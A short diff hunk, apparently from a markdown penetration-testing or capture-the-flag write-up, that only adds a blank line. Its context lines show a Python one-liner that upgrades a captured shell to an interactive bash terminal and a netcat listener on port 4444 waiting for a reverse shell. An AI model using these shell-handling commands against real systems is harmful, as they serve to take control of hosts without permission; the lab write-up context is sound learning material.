@@ -283,6 +283,7 @@ Password:
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 <br>
+
 ```
 └─$ nc -lnvp 4444
 listening on [any] 4444 ...
